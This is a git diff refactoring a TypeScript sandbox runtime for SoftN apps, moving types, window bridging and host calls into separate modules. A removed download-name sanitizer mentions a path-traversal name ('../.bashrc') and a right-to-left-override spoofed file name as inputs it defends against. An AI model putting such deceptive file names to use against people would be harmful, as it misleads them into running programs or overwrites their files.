@@ -23,12 +23,11 @@ import {
   type SymbolScope,
 } from './vm-adapter';
 import { SandboxHost } from './sandbox-host';
-import { readZipText } from './zip-text';
-import { sha256Hex } from '../bundle/crypto';
 import { SOFTN_BRIDGE_PREAMBLE } from './softn-preamble';
-import { LogicTimers, TIMER_PREAMBLE_NAMES, TIMER_TRAILER, timerPreamble } from './logic-timers';
+import { LogicTimers, TIMER_TRAILER, timerPreamble } from './logic-timers';
 import { placeSyntaxError } from './logic-syntax';
 import { moduleSyntaxAsScript } from './module-syntax';
+import { inlineLogicImports } from './logic-imports';
 import { sanitizeArgs } from './vm-args';
 import type { DocumentShell, ShellOp } from '../document-shell/host';
 import {
@@ -42,8 +41,7 @@ import {
   usesDocument,
 } from '../document-shell/names';
 import type { LocalSpeechHost } from './local-speech';
-import { extractEventProps } from './event-props';
-import { appHears, clearCapturedKeys, parseCapturedKeys, setAppElement, setCapturedKeys, shouldCaptureKey } from './key-capture';
+import { clearCapturedKeys, parseCapturedKeys, setAppElement, setCapturedKeys } from './key-capture';
 import { deepEqual } from './vm-state';
 import {
   COMPUTED_PREFIX,
@@ -56,94 +54,69 @@ import {
   type ComputedDeclaration,
 } from './computed-declarations';
 import { readsOfDrawnFunctions } from './drawn-functions';
-import { storageVisitorToken } from './visitor-token';
 
-import type { ScriptBlock, LogicBlock, SoftNDocument } from '../parser/ast';
+import type { SoftNDocument } from '../parser/ast';
 import type { AppPermissions } from '../bundle/types';
-import { getFileByRef, registerFileRef } from './file-registry';
-import { pcmToWavDataUrl } from './wav';
-import { isRemoteUrl } from '../renderer/sanitize-html';
 import { buildSyncCacheKey } from './sync-cache-key';
-import { describeNetDestination } from './egress-policy';
 import { createDBNamespace, type DBNamespace } from './script-modules';
-import { EventCoalescer, coalescePolicyFor } from './event-coalescer';
-import type {
-  BundleFileProvider,
-  AIPermissionConfig,
-  GpuPermissionConfig,
-} from './ai-manager';
+import {
+  BRIDGE_VARS,
+  EXTERNAL_VALUES_VAR,
+  UNSUPPORTED_EXTERNAL_VALUE,
+  VALID_IDENTIFIER,
+  collectExternalValues,
+  externalValuesPreamble,
+  readExternalValue,
+  type ExternalPrimitive,
+} from './external-values';
+import { WindowBridge } from './window-bridge';
+import { requireNetHost, requirePermission, type HostGate } from './host-calls/permissions';
+import { AppNetwork } from './host-calls/network';
+import { AppAudio } from './host-calls/audio';
+import { AppMicrophone } from './host-calls/microphone';
+import { QrReader } from './host-calls/qr';
+import { pickFile, readBase64, readText, readZipText, saveFile } from './host-calls/files';
+import { AppAI } from './host-calls/ai';
+import type { BundleFileProvider } from './ai-manager';
 import { debug } from './debug';
+import type { RuntimeState } from '../types';
+import type {
+  CodeBlock,
+  DocumentShellRequest,
+  NetFetchHandler,
+  PendingHostCall,
+  PermissionConfig,
+  PersistenceFailure,
+  ScriptContext,
+  ScriptLoadResult,
+  ScriptRuntimeHandle,
+  ScriptRuntimeMode,
+  ScriptRuntimeOptions,
+} from './script-runtime-types';
+
+// The runtime's types are in script-runtime-types.ts, and exported from here as they always were.
+export type {
+  CodeBlock,
+  ConsoleModule,
+  DocumentShellRequest,
+  NavModule,
+  NetFetchHandler,
+  NetFetchResult,
+  PendingHostCall,
+  PermissionConfig,
+  PersistenceFailure,
+  ScriptContext,
+  ScriptLoadResult,
+  ScriptRuntimeHandle,
+  ScriptRuntimeMode,
+  ScriptRuntimeOptions,
+  XDBModule,
+} from './script-runtime-types';
 export type { BundleFileProvider } from './ai-manager';
 // Beside `collectObservedStateNames`, which a host calls with it.
 export { collectDrawnNames } from './drawn-functions';
-
-/**
- * Type alias for code blocks - either ScriptBlock or LogicBlock
- */
-export type CodeBlock = ScriptBlock | LogicBlock;
-import type { RuntimeState, XDBRecord } from '../types';
-
-/**
- * Execution context handed to SoftN scripts.
- */
-export interface ScriptContext {
-  // State management
-  state: RuntimeState;
-  setState: (path: string, value: unknown) => void;
-  /** Batch multiple state changes into a single React setState call (optional optimization) */
-  batchSetState?: (changes: Record<string, unknown>) => void;
-  /**
-   * Draw the page again, though no state it holds has changed: state that
-   * only a function the page calls while it is drawn reads has moved in the
-   * engine. Optional; a host without it has such state copied to the page
-   * instead, which is slower and has the same effect.
-   */
-  redraw?: () => void;
-
-  // XDB data
-  data: Record<string, XDBRecord[]>;
-
-  // XDB operations
-  xdb: XDBModule;
-
-  // Navigation
-  nav: NavModule;
-
-  // Console (for debugging)
-  console: ConsoleModule;
-}
-
-/**
- * XDB module for SoftN scripts
- */
-export interface XDBModule {
-  create: (collection: string, data: Record<string, unknown>) => Promise<XDBRecord>;
-  update: (id: string, data: Record<string, unknown>) => Promise<XDBRecord>;
-  delete: (id: string) => Promise<void>;
-  query: (collection: string, filter?: Record<string, unknown>) => Promise<XDBRecord[]>;
-  get: (collection: string, id: string) => Promise<XDBRecord | null>;
-  sync: () => Promise<void>;
-}
-
-/**
- * Navigation module for SoftN scripts
- */
-export interface NavModule {
-  goto: (page: string) => void;
-  back: () => void;
-  params: Record<string, string>;
-}
-
-/**
- * Console module for SoftN scripts
- */
-export interface ConsoleModule {
-  log: (...args: unknown[]) => void;
-  error: (...args: unknown[]) => void;
-  warn: (...args: unknown[]) => void;
-}
-
-export type ScriptRuntimeMode = 'main' | 'worker';
+export { buildExternalValuesPreamble } from './external-values';
+export { downloadName } from './host-calls/files';
 
 /** State the framework reads by name, whatever the document happens to say. */
 const FRAMEWORK_OBSERVED_STATE: readonly string[] = ['currentPage'];
@@ -186,254 +159,6 @@ export function collectObservedStateNames(doc: SoftNDocument): ReadonlySet<strin
 }
 
 /**
- * How a runtime gets the document a page's code is given: made, and its
- * code loaded, only when the code turns out to use one. Most pages never do.
- */
-export interface DocumentShellRequest {
-  create(): Promise<DocumentShell>;
-}
-
-export interface ScriptRuntimeOptions {
-  mode?: ScriptRuntimeMode;
-  /**
-   * The document the page's code is given when it uses one (`document.…`):
-   * its plain HTML as a tree the code can find, change and listen to, as in
-   * a browser (document-shell/). Taken only by JavaScript on the main
-   * thread; Python, and a script in a worker, are not given it.
-   */
-  documentShell?: DocumentShellRequest;
-  /**
-   * The page's markup has handlers written for a browser that SoftN does not
-   * read (see `hasPageHandlers`): the page is given its document for them,
-   * whatever its code says.
-   */
-  browserHandlers?: boolean;
-  /**
-   * Where the app's own files are, as its markup's `src="images/x.png"`
-   * finds them: what a page's `fetch('data.json')` reads (`bundle.read`).
-   */
-  assetResolver?: (path: string) => string;
-  /**
-   * Logic files the host already concatenated into `script.code` itself.
-   *
-   * A host that assembles a bundle may inline manifest-listed `.logic` files
-   * ahead of the entry file. Those files are then already part of this
-   * compilation, so an `import` naming one must not inline it a second time —
-   * every class and variable in it would be declared twice, which the VM
-   * rejects. Paths are bundle-relative, matching what `importResolver` takes.
-   */
-  preIncludedLogicPaths?: readonly string[];
-  /**
-   * The bundle's parsed `permission.json`.
-   *
-   * Without it every capability check runs in "no config" mode, which is
-   * permissive for most APIs but still refuses plain `http://` — so a bundle
-   * that legitimately declares `net.allow_http` cannot reach its own server.
-   */
-  permissionConfig?: PermissionConfig;
-  /**
-   * Every identifier the document could resolve against React state.
-   *
-   * State variables outside this set are owned by the VM: the host neither
-   * reads them back nor writes them, because nothing outside the VM can
-   * observe them. See {@link SoftNScriptRuntime.partitionStateVars}.
-   *
-   * Omit it and every state variable is synced, which is what every host did
-   * before this existed and is always correct — just slower.
-   */
-  observedStateNames?: ReadonlySet<string>;
-  /**
-   * Every name the document could call while it is drawn, from
-   * `collectDrawnNames`: the names its expressions are written with, without
-   * what only an event runs.
-   *
-   * A function among them is how a page reads state its markup does not
-   * name, so what that function may read is observed as well. Only looked at
-   * beside {@link observedStateNames}. Omit it and every observed name is
-   * supposed to be drawn, which is correct and holds less back: a game's
-   * `@tick={tick}` then counts, and `tick` reads everything.
-   */
-  drawnNames?: ReadonlySet<string>;
-  /**
-   * Where `softn.storage.*` sends its operations: the storage endpoint of
-   * the app in the directory that published it. Absent for an app opened
-   * from a file, which then has no server storage and is told so.
-   */
-  storageEndpoint?: string;
-  /** Host-owned action bridge. No URLs or credentials are exposed to app scripts. */
-  backendCall?: (action: string, input: Record<string, unknown>) => Promise<unknown>;
-  /**
-   * Where `softn.net.fetch` goes instead of the browser's `fetch`.
-   *
-   * Some hosts do not give an app the network at all: they route what it asks
-   * for through something of their own — a backend that owns the credentials,
-   * a proxy that owns the allowlist — and the app never holds a URL the
-   * browser would act on. Those hosts used to do this by rewriting
-   * `softn.net.fetch` inside the guest, which works only while the guest is
-   * JavaScript and only while the host is willing to edit the author's source.
-   * This is the same substitution made on the host's side of the VM, so it
-   * does not depend on either.
-   *
-   * Setting it MOVES the capability, checks included. `permission.json`'s
-   * `net` block and `allowed_hosts` describe what the app may reach with the
-   * browser's `fetch`, and there is no browser `fetch` here; the handler's
-   * owner decides what the call is allowed to become. That is the same
-   * arrangement as `backendCall`, which has never been permission-checked
-   * either, because the host names the actions it will answer.
-   *
-   * Absent — every host that has one today — `softn.net.fetch` is exactly what
-   * it was: the permission check, the host allowlist, and the browser's fetch.
-   */
-  netFetchHandler?: NetFetchHandler;
-  /**
-   * The app's logic, when it is written in Python rather than JavaScript.
-   *
-   * `composeBundleSource` sets it from the bundle's own file names: a logic
-   * file ending `.py` is Python. When it is present the script's `<logic>`
-   * block is empty by construction and these modules are what the engine
-   * compiles — there is no JavaScript to assemble, and an engine that cannot
-   * run Python is refused before any of the author's code is touched.
-   */
-  pythonProject?: PythonProject;
-  /**
-   * The visitor identity sent with storage requests, for collections whose
-   * policy records who added a record. Absent, the runtime uses the token
-   * this browser keeps (see visitor-token.ts); null sends none.
-   */
-  storageVisitorToken?: string | null;
-  /**
-   * Called when a `localStorage` write the script made was refused by the
-   * browser — quota, most often. The script sees the failure too, as an
-   * exception from the call; this is for the host to tell the person, who
-   * otherwise learns of a lost save when they come back for it.
-   */
-  onPersistenceFailure?: (failure: PersistenceFailure) => void;
-  /**
-   * Show what the page's `alert()` says, inside the app. With none, it is
-   * written to the console: the browser's own dialog is never used, since
-   * it carries the host's name and holds the whole tab.
-   */
-  onAlert?: (message: string) => void;
-}
-
-/**
- * What `softn.net.fetch` answers a script with: the browser response reduced
- * to what crosses into the VM. A handler returns this so a script cannot tell
- * which side of the VM the request was made from.
- */
-export interface NetFetchResult {
-  ok: boolean;
-  status: number;
-  statusText?: string;
-  body: string;
-  headers: Record<string, string>;
-}
-
-/**
- * A host's stand-in for the browser's `fetch`, for `softn.net.fetch`.
- *
- * `options` is the object the script passed, already parsed — `method`,
- * `headers`, `body`, `timeout` — and `url` is the URL it wrote, unjudged. See
- * {@link ScriptRuntimeOptions.netFetchHandler} for what supplying one means.
- */
-export type NetFetchHandler = (
-  url: string,
-  options: Record<string, unknown>
-) => Promise<NetFetchResult>;
-
-/** A write to the browser's storage that was not kept, as reported to the host. */
-export interface PersistenceFailure {
-  /** `setItem`, `removeItem` or `clear`. */
-  operation: string;
-  /** The script's own key, without the app prefix; empty for `clear`. */
-  key: string;
-  /** The browser's exception, with its own name for the cause. */
-  error: Error;
-}
-
-export interface ScriptLoadResult {
-  state: Record<string, unknown>;
-  functions: Record<string, (...args: unknown[]) => Promise<unknown>>;
-  syncFunctions: Record<string, (...args: unknown[]) => unknown>;
-  computed: Record<string, () => unknown>;
-}
-
-export interface ScriptRuntimeHandle {
-  loadScript: (script: CodeBlock) => Promise<ScriptLoadResult>;
-  updateContext: (newState: Partial<RuntimeState>) => void;
-  cleanup: () => void;
-  /** The element the app is drawn in: its window listeners hear what is aimed there. */
-  setAppRoot?: (element: Element | null) => void;
-}
-
-/**
- * Permission config from permission.json — describes what capabilities an app needs.
- */
-export interface PermissionConfig {
-  app?: { id?: string; name?: string; version?: string };
-  permissions: {
-    net?: { enabled?: boolean; allowed_hosts?: string[]; allow_http?: boolean };
-    camera?: { enabled?: boolean; modes?: string[] };
-    mic?: { enabled?: boolean; maxSeconds?: number };
-    files?: { enabled?: boolean; scopes?: string[] };
-    qr?: { enabled?: boolean };
-    ai?: AIPermissionConfig;
-    gpu?: GpuPermissionConfig;
-    sync?: { enabled?: boolean };
-    /**
-     * The app's own database on the directory that publishes it, reached
-     * through `softn.storage.*`. Unrelated to the manifest's legacy
-     * `permissions.storage` flag, which is about localStorage.
-     */
-    storage?: {
-      enabled?: boolean;
-      /**
-       * A policy per collection name (`*` for the rest): who may read, add,
-       * change and remove its records. See STORAGE_POLICIES in capabilities.ts.
-       * Fixed at publication; the directory enforces it, not the runtime.
-       */
-      collections?: Record<string, string>;
-    };
-    /**
-     * Generated numeric code runs on the host's own engine: the script hands
-     * over functions it builds at run time (an emulator's compiled traces, a
-     * signal kernel), validated against a closed arithmetic language and bound
-     * to views of the script's typed arrays. Many times faster than the
-     * sandbox's interpreter for that code; nothing else of the host is
-     * reachable from it.
-     */
-    accel?: { enabled?: boolean };
-  };
-  /**
-   * The bundle declared capabilities and the user has not answered yet.
-   *
-   * Set by the host when it boots an app with its declared capabilities
-   * withheld so the UI can be seen before anything is granted. `permissions`
-   * is empty in that state, so every check already denies; this only changes
-   * what the denial says. Without it the app is told to "add net.enabled to
-   * permission.json" — advice for an author, about a file that already says
-   * exactly that, aimed at a user who has simply not clicked Allow.
-   */
-  consentPending?: boolean;
-}
-
-/** Pending host call from the VM (mirrors Rust PendingHostCall) */
-export interface PendingHostCall {
-  id: number;
-  kind: string;
-  args: string[];
-}
-
-/** How a sound reached silence — what `audio.whenEnded` resolves with. */
-interface AudioOutcome {
-  handle: string;
-  status: 'ended' | 'stopped' | 'error';
-  durationMs?: number;
-  reason?: string;
-}
-
-
-/**
  * Fast compatibility check used for worker-mode migration gating.
  * Scripts that rely on synchronous host bridges are currently main-thread only.
  *
@@ -472,21 +197,6 @@ export function detectWorkerIncompatibilities(code: string): string[] {
 }
 
 /**
- * Names of variables added by BRIDGE_PREAMBLE that should not be treated
- * as user state variables.
- */
-const EXTERNAL_VALUES_VAR = '__softnExternalValues';
-const BRIDGE_VARS = new Set([
-  'window',
-  'navigator',
-  'host',
-  'softn',
-  EXTERNAL_VALUES_VAR,
-  ...TIMER_PREAMBLE_NAMES,
-]);
-const EXTERNAL_FUNCTION_RESERVED_NAMES = new Set([...BRIDGE_VARS, 'db', 'localStorage']);
-
-/**
  * Cross-check every "unchanged" digest against a full value comparison.
  *
  * Set `globalThis.__SOFTN_FP_AUDIT__ = true` before a bundle loads. Costs
@@ -504,56 +214,6 @@ function FINGERPRINT_AUDIT(): boolean {
  * pair that never will is allowed to cost.
  */
 const COMPUTED_SETTLE_PASSES = 8;
-
-/** Kinds of file a double-click runs rather than opens. */
-const RUNS_WHEN_OPENED =
-  /\.(?:exe|com|bat|cmd|msi|msix|msp|scr|pif|lnk|url|hta|js|jse|vbs|vbe|wsf|wsh|ps1|psm1|reg|cpl|jar|app|dmg|pkg|command|desktop|appimage|deb|rpm|apk|sh|scf|inf|gadget|application|appref-ms)$/i;
-
-/**
- * The name a file an app saves is offered under. A leaf, never a path, so an
- * app cannot suggest "../.bashrc"; no control characters, and none of the
- * invisible ones that turn text around (`report\u202efdp.exe` reads as
- * `reportexe.pdf`); not a name Windows keeps for a device; and a kind of file
- * that runs when it is opened is saved as text, so a click in an app is never
- * a program on the person's desktop.
- */
-export function downloadName(raw: unknown): string {
-  let name = String(raw || 'download')
-    // The control characters are the point of the pattern, not a slip.
-    // eslint-disable-next-line no-control-regex
-    .replace(/[\\/:*?"<>|\u0000-\u001f\u007f-\u009f]/g, '_')
-    .replace(/[\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/g, '')
-    .replace(/^[.\s]+/, '')
-    .replace(/[.\s]+$/, '')
-    .slice(0, 200);
-  if (!name) name = 'download';
-  if (/^(?:con|prn|aux|nul|com\d|lpt\d)(?:\.|$)/i.test(name)) name = `_${name}`;
-  if (RUNS_WHEN_OPENED.test(name)) name = `${name}.txt`;
-  return name;
-}
-
-/** `window.__…` names a script's window never writes to the page's (see syncWindowFromVM). */
-const HOST_WINDOW_NAME = /^__(?:tauri|react|softn|vite|webpack|playwright|vue|next|nuxt|zone|proto__$)/i;
-
-/** A name safe to paste into generated source as an identifier. */
-const VALID_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;
-
-type ExternalPrimitive = string | number | boolean | null | undefined;
-const UNSUPPORTED_EXTERNAL_VALUE = Symbol('unsupported external value');
-type ExternalValueRead = ExternalPrimitive | typeof UNSUPPORTED_EXTERNAL_VALUE;
-
-/** Match the value JSON source generation used for external bridge snapshots. */
-function normalizeExternalPrimitive(value: unknown): ExternalValueRead {
-  if (value === null || value === undefined) return value;
-  if (typeof value === 'string' || typeof value === 'boolean') return value;
-  if (typeof value === 'number') {
-    // JSON.stringify was historically used for the injected return literal:
-    // non-finite numbers became null and negative zero became zero.
-    if (!Number.isFinite(value)) return null;
-    return Object.is(value, -0) ? 0 : value;
-  }
-  return UNSUPPORTED_EXTERNAL_VALUE;
-}
 
 /**
  * SoftN Script Runtime
@@ -591,8 +251,6 @@ export class SoftNScriptRuntime {
   private netFetchHandler?: NetFetchHandler;
   /** The Python modules to compile, when the app's logic is Python. */
   private pythonProject?: PythonProject;
-  private storageEndpoint: string | null = null;
-  private visitorToken: string | null | undefined = undefined;
   /** State variables held back from syncing, for diagnostics only. */
   private vmOwnedStateNames: string[] = [];
   /** The same names as a set, for the per-key push to consult on every call. */
@@ -641,42 +299,8 @@ export class SoftNScriptRuntime {
   /** Whether the values have been said not to settle. */
   private computedUnsettledSaid = false;
 
-  /**
-   * Active native event listeners for the window bridge.
-   * Managed at the JS level since the WASM VM stores handler Values internally.
-   */
-  private nativeListeners: Map<string, EventListener[]> = new Map();
-  /** Per-frame delivery for the high-frequency events; disposed with the listeners. */
-  private eventCoalescers: EventCoalescer[] = [];
-
-  /** Index of the `window` global in the VM */
-  private windowGlobalIndex: number = -1;
-
-  /** Set of __ window property keys to sync */
-  private syncKeys: Set<string> = new Set();
-  /** Cached: true when at least one syncKey is defined on the real window */
-  private windowSyncActive = false;
-  /**
-   * The `__` globals the host page already had when this runtime was made —
-   * `__TAURI__`, `__softnAsset`, a devtools hook. A script may read them, and
-   * a script that sets `window.__TAURI__` in the VM is welcome to its own
-   * copy, but none of them is written back to the real window: that is the
-   * host's bridge to native, and a bundle replacing it is a bundle taking the
-   * host over. Everything the app introduces itself still syncs both ways,
-   * which is what the games' input latches (`__scene3dLocked`, `__dhFire`)
-   * rely on — Scene3D and the demo driver set those on the real window after
-   * the script has declared them.
-   */
-  private readonly hostWindowKeys: Set<string>;
-  /**
-   * Keys this runtime wrote onto the real window. Removed again at cleanup,
-   * so that a reload of the same app does not find its own latches already
-   * there and mistake them for the host's.
-   */
-  private windowKeysWritten = new Set<string>();
-
-  /** Event types already bridged from VM → browser (prevents duplicate listeners) */
-  private bridgedEventTypes: Set<string> = new Set();
+  /** The page's window as the script meets it: its listeners and its `window.__…` values. */
+  private readonly windowBridge: WindowBridge;
 
   /** Import resolver for .logic file imports (resolves path → source code) */
   private importResolver?: (path: string) => Promise<string | null>;
@@ -691,15 +315,7 @@ export class SoftNScriptRuntime {
 
   /** Permission config from permission.json (set via setPermissionConfig) */
   private permissionConfig: PermissionConfig | null = null;
-
-  /** Local models on ZIPP, created on the first softn.ai.model.* call (models/model-host.ts). */
-  private modelHost: import('./models/model-host').ModelHost | null = null;
-  /** Lazy-loaded GPU compute manager (created on first softn.ai.gpu.* call) */
-  private gpuComputeManager: import('./ai-gpu-compute-manager').GpuComputeManager | null = null;
-  /** Bundle file provider for loading models from .softn bundles */
-  private bundleFileProvider: BundleFileProvider | null = null;
   /** External functions (e.g. wallet bridge) to inject into the VM as callable globals */
-  private sandboxHost: SandboxHost | null = null;
   private externalFunctions: Record<string, (...args: unknown[]) => unknown> | null = null;
   /** No-argument external bridge names compiled into the current VM. */
   private externalFunctionNames: string[] = [];
@@ -707,52 +323,24 @@ export class SoftNScriptRuntime {
   private externalFunctionValues: ExternalPrimitive[] = [];
   /** Slot holding the mutable external bridge value table inside the VM. */
   private externalValuesGlobalIndex = -1;
-  /** Network requests owned by this runtime, cancelled when the app closes. */
-  private netAbortControllers = new Set<AbortController>();
+
+  // What the script's `softn.*` calls reach, each in host-calls/ with what it
+  // keeps, and each closed with the app (see cleanup).
+  /** What every one of them asks of this runtime: its permission checks, read live. */
+  private readonly gate: HostGate;
+  /** `softn.net.fetch`, the app's own files, and its server storage. */
+  private readonly network: AppNetwork;
+  private readonly audio: AppAudio;
+  private readonly microphone: AppMicrophone;
+  private readonly qr: QrReader;
+  /** Local models and GPU compute. */
+  private readonly ai: AppAI;
+  /** The device's voices, loaded at the app's first speech call (local-speech.ts). */
   private localSpeech: LocalSpeechHost | null = null;
-  private static readonly MAX_NET_RESPONSE_BYTES = 10 * 1024 * 1024;
+  /** The worker `softn.sandbox.run` runs code in, made at its first call. */
+  private sandboxHost: SandboxHost | null = null;
   /** A page that has said this much with `alert()` has stopped telling the person anything. */
   private static readonly MAX_ALERTS = 50;
-
-  /** Sounds this app currently has playing, by the handle its script holds.
-   *  `watchers` are pending `whenEnded` calls; each hears exactly one outcome. */
-  private audioPlaying = new Map<
-    string,
-    {
-      el: HTMLAudioElement;
-      volume: number;
-      watchers: Array<(outcome: AudioOutcome) => void>;
-    }
-  >();
-  /** Outcomes of sounds that are gone, so a `whenEnded` asked after the fact
-   *  still answers with what happened. Every one-shot lands here, so it is
-   *  capped — the oldest is forgotten and reads as unknown. */
-  private audioFinished = new Map<string, AudioOutcome>();
-  private static readonly MAX_AUDIO_FINISHED = 256;
-  private audioMasterVolume = 1;
-  private audioSeq = 0;
-  /** Gesture listeners waiting to start a soundtrack the browser refused. */
-  private audioUnlockers = new Set<() => void>();
-
-  /** QR image loads/detections in flight. Cleanup rejects them immediately. */
-  private qrDecodeCancelers = new Set<() => void>();
-  private static readonly QR_OPERATION_TIMEOUT_MS = 10_000;
-
-  /**
-   * The recording in flight, if any.
-   *
-   * One at a time: two overlapping `softn.mic.record()` calls would fight over
-   * the same device, and the second would take the first's samples with it.
-   * `finish` is how both the duration timer and an early `mic.stop()` end the
-   * same recording without either needing to know about the other.
-   */
-  private micRecording: { stop: (reason: 'complete' | 'stopped') => void } | null = null;
-  /**
-   * Device access can remain pending while the browser shows its permission
-   * prompt. Reserve that interval too, so cleanup and a second record request
-   * cannot lose track of a stream that has not been handed back yet.
-   */
-  private micAcquisition: { cancelled: boolean } | null = null;
 
   constructor(
     context: ScriptContext,
@@ -767,23 +355,21 @@ export class SoftNScriptRuntime {
     this.context = context;
     this.permissions = permissions;
     this.appId = appId;
-    // Taken before the app's document mounts, so what is here is the host's.
-    this.hostWindowKeys = new Set(
-      typeof window === 'undefined'
-        ? []
-        : Object.getOwnPropertyNames(window).filter((k) => k.startsWith('__'))
+    // Made now, before the app's document mounts: the `__` globals already on
+    // the window are the host's (see WindowBridge.hostWindowKeys).
+    this.windowBridge = new WindowBridge(
+      this,
+      () => this.vmEngine,
+      (eventType, eventObj, throttled) => this.dispatchWindowEvent(eventType, eventObj, throttled)
     );
     this.runtimeMode = options?.mode || 'main';
     this.documentShellRequest = options?.documentShell ?? null;
     this.browserHandlers = options?.browserHandlers === true;
-    this.assetResolver = options?.assetResolver ?? null;
     this.observedStateNames = options?.observedStateNames ?? null;
     this.drawnNames = options?.drawnNames ?? null;
-    this.storageEndpoint = options?.storageEndpoint ?? null;
     this.backendCall = options?.backendCall;
     this.netFetchHandler = options?.netFetchHandler;
     this.pythonProject = options?.pythonProject;
-    this.visitorToken = options?.storageVisitorToken;
     this.onPersistenceFailure = options?.onPersistenceFailure ?? null;
     this.onAlert = options?.onAlert ?? null;
     this.externalFunctions = externalFunctions ?? null;
@@ -792,37 +378,37 @@ export class SoftNScriptRuntime {
       this.importResolver = importResolver as (path: string) => Promise<string | null>;
     }
     this.logicBasePath = logicBasePath;
-    this.bundleFileProvider = bundleFileProvider ?? null;
     if (options?.permissionConfig) {
       this.permissionConfig = options.permissionConfig;
     }
     for (const p of options?.preIncludedLogicPaths ?? []) {
       this.includedLogicPaths.add(p);
     }
+
+    // Read when asked, never kept: a grant replaces the permission config
+    // after the app starts, and the app can close while a call waits.
+    const gate: HostGate = {
+      checkPermission: (capability) => this.checkPermission(capability),
+      checkNetHost: (url) => this.checkNetHost(url),
+      permissionConfig: () => this.permissionConfig,
+      disposed: () => this.disposed,
+    };
+    this.gate = gate;
+    this.network = new AppNetwork(gate, {
+      assetResolver: options?.assetResolver ?? null,
+      bundleFileProvider: bundleFileProvider ?? null,
+      storageEndpoint: options?.storageEndpoint ?? null,
+      visitorToken: options?.storageVisitorToken,
+    });
+    this.audio = new AppAudio(gate, () => this.externalFunctions?.asset);
+    this.microphone = new AppMicrophone(gate);
+    this.qr = new QrReader(gate);
+    this.ai = new AppAI(gate, (path) => this.network.readBlob(path), bundleFileProvider ?? null);
   }
 
   /** Set the permission config for this runtime (from permission.json). */
   setPermissionConfig(config: PermissionConfig): void {
     this.permissionConfig = config;
-  }
-
-  /** Read the current value of a no-argument host bridge without leaking errors. */
-  private readExternalFunctionValue(name: string): ExternalValueRead {
-    try {
-      const fn = this.externalFunctions?.[name];
-      if (typeof fn !== 'function') return UNSUPPORTED_EXTERNAL_VALUE;
-
-      const result = fn();
-      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
-        // These VM globals are synchronous snapshots. Keep async bridges out of
-        // them, and make sure a rejected promise cannot become unhandled.
-        Promise.resolve(result).catch(() => {});
-        return UNSUPPORTED_EXTERNAL_VALUE;
-      }
-      return normalizeExternalPrimitive(result);
-    } catch {
-      return UNSUPPORTED_EXTERNAL_VALUE;
-    }
   }
 
   /**
@@ -835,7 +421,7 @@ export class SoftNScriptRuntime {
     if (!this.vmEngine || this.externalValuesGlobalIndex < 0) return;
 
     const nextValues = this.externalFunctionNames.map((name) => {
-      const value = this.readExternalFunctionValue(name);
+      const value = readExternalValue(this.externalFunctions, name);
       return value === UNSUPPORTED_EXTERNAL_VALUE ? undefined : value;
     });
     const changed = nextValues.some(
@@ -989,8 +575,9 @@ export class SoftNScriptRuntime {
         // The entry file is already in `script.code`, so it counts as included
         // for dedupe as well as being the root of the cycle-detection chain.
         if (this.logicBasePath) this.includedLogicPaths.add(this.logicBasePath);
-        resolvedCode = await this.resolveImports(
+        resolvedCode = await inlineLogicImports(
           resolvedCode,
+          { resolver: this.importResolver, included: this.includedLogicPaths },
           new Set(this.logicBasePath ? [this.logicBasePath] : []),
           this.logicBasePath
         );
@@ -1002,34 +589,11 @@ export class SoftNScriptRuntime {
       // 4. Generate preamble for external functions (e.g. wallet bridge).
       // Wrappers read a mutable VM-side table so later host implementations can
       // update without recompiling or re-running script initialization.
-      let extFnPreamble = '';
-      this.externalFunctionNames = [];
-      this.externalFunctionValues = [];
+      const external = collectExternalValues(this.externalFunctions);
+      this.externalFunctionNames = external.names;
+      this.externalFunctionValues = external.values;
       this.externalValuesGlobalIndex = -1;
-      if (this.externalFunctions) {
-        for (const name of Object.keys(this.externalFunctions)) {
-          // Skip names that cannot safely become VM declarations or are served
-          // by another bridge path.
-          if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
-          if (name.startsWith('xdb_') || name === 'asset') continue;
-          const value = this.readExternalFunctionValue(name);
-          // Preserve the established bridge contract: only synchronous
-          // primitive-valued getters become globals in this compilation.
-          if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
-          this.externalFunctionNames.push(name);
-          this.externalFunctionValues.push(value);
-        }
-
-        if (this.externalFunctionNames.length > 0) {
-          const serializedValues = this.externalFunctionValues
-            .map((value) => (value === undefined ? 'undefined' : JSON.stringify(value)))
-            .join(',');
-          extFnPreamble = `let ${EXTERNAL_VALUES_VAR} = [${serializedValues}];\n`;
-          for (let i = 0; i < this.externalFunctionNames.length; i++) {
-            extFnPreamble += `function ${this.externalFunctionNames[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }\n`;
-          }
-        }
-      }
+      const extFnPreamble = externalValuesPreamble(external.names, external.values);
 
       // 4b. Compile each `$:` declaration into a real function.
       //
@@ -1136,7 +700,7 @@ export class SoftNScriptRuntime {
     if (useHostBridges) {
       const windowSym = symbolMap.get('window');
       if (windowSym) {
-        this.windowGlobalIndex = windowSym.index;
+        this.windowBridge.windowGlobalIndex = windowSym.index;
       }
     }
 
@@ -1330,8 +894,8 @@ export class SoftNScriptRuntime {
     let pending: PendingHostCall[] = [];
     try {
       pending = this.vmEngine.drainPendingHostCalls();
-      this.bridgeEventListeners();
-      this.discoverWindowSyncKeys();
+      this.windowBridge.listen();
+      this.windowBridge.discoverSyncKeys();
     } catch (error) {
       console.error('[SoftN] Error taking what the script queued as it loaded:', error);
     } finally {
@@ -1482,7 +1046,7 @@ export class SoftNScriptRuntime {
       this.syncReactStateToVM();
       this.syncExternalFunctionsToVM();
       // Sync real browser window → VM window
-      this.syncWindowToVM();
+      this.windowBridge.toVM();
       // The function reads `$:` values as they are for the state it is
       // called with, not as they were when the script loaded.
       this.settleComputedIfStale();
@@ -1521,7 +1085,7 @@ export class SoftNScriptRuntime {
         if (!this.disposed) {
           const tSyncReact = performance.now();
           this.syncVMStateToReact();
-          this.syncWindowFromVM();
+          this.windowBridge.fromVM();
           this._perfSyncToReactMs += performance.now() - tSyncReact;
 
           // Drain pending host calls while holding the lock
@@ -1535,8 +1099,8 @@ export class SoftNScriptRuntime {
           // After each async call, discover any new VM event listeners and
           // window.__ properties — this bridges keyboard/mouse handlers
           // registered in _init() or other functions to real browser events.
-          this.bridgeEventListeners();
-          this.discoverWindowSyncKeys();
+          this.windowBridge.listen();
+          this.windowBridge.discoverSyncKeys();
         }
       } catch (syncError) {
